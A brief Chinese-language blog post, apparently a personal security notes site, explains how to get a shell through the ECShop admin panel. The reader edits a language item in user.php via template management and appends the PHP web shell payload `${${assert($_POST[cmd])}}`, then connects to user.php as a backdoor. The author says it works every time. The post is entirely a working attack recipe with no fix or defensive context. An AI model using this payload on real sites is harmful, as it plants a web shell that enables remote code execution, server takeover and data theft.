---
title: "ecshop 后台 getshell"
date: 2018-01-07T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['cms']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

ecshop 后台 getshell

<!--more-->

模板管理 - 语言项编辑

下拉栏选择 user.php 搜索 用户信息

![](http://exp10it-1252109039.cossh.myqcloud.com/2018/01/07/1515297913.jpg)

后面加上代码

`${${assert($_POST[cmd])}}`

确认修改

连接 根目录下 user.php

屡试不爽